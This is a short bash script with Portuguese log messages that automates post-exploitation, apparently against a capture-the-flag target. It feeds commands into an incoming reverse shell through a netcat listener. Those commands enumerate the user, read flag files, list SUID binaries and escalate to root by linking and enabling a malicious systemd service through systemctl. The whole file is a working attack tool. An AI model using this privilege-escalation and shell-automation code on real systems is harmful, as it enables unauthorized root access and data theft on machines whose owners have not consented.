#!/bin/bash
source "$(dirname "$0")/../common.sh"

log "[POST] Iniciando automação pós-exploração..."

# comandos que serão enviados para o alvo
cat << 'EOF' > /tmp/post_commands.sh
echo "[+] User:"
whoami

echo "[+] User flag:"
cat /home/*/user.txt 2>/dev/null

echo "[+] SUID files:"
find / -perm -4000 -type f 2>/dev/null

echo "[+] Tentando privesc com systemctl..."

TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=/bin/sh -c 'cat /root/root.txt > /tmp/root.txt'
[Install]
WantedBy=multi-user.target" > $TF

systemctl link $TF 2>/dev/null
systemctl enable --now $TF 2>/dev/null

echo "[+] Root flag:"
cat /tmp/root.txt 2>/dev/null || echo "[-] Falha"
EOF

log "[POST] Aguardando shell..."

# inicia listener e injeta comandos automaticamente
nc -lvnp "$LISTENER_PORT" < /tmp/post_commands.sh | tee ../../reports/post_auto.txt